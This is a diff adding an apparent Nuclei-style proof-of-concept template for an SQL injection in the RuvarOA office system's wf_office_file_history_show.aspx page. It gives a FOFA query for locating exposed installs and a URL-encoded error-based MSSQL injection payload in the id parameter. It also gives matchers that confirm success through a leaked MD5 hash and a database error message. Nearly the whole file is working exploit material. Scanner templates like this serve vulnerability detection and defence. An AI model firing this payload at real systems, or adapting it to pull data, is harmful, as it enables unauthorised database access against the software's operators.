@@ -1,0 +1,29 @@
+id: poc-yaml-ruvaroa-wf-office-file-history-show-aspx-sqli
+info:
+  name: RuvarOA wf_office_file_history_show.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: ruvar-oa
+    fofa: body="txt_admin_key"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/WorkFlow/wf_office_file_history_show.aspx?id=1%27%20and%20%28sys.fn_varbintohexstr%28hashbytes%28%27MD5%27,%27{{t1}}%27%29%29%29%3E0--"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "{{t2}}"
+      - type: status
+        status:
+          - 200
